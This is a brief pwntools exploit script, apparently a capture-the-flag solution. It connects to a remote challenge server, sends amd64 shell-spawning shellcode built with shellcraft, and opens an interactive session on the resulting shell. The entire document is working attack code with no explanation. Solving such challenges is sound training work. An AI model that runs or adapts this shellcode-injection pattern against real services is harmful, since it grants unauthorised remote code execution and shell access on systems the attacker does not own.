from pwn import *

io = remote('io.ept.gg', 31350)

context.arch = 'amd64'

io.sendline(asm(shellcraft.sh()))

io.interactive()

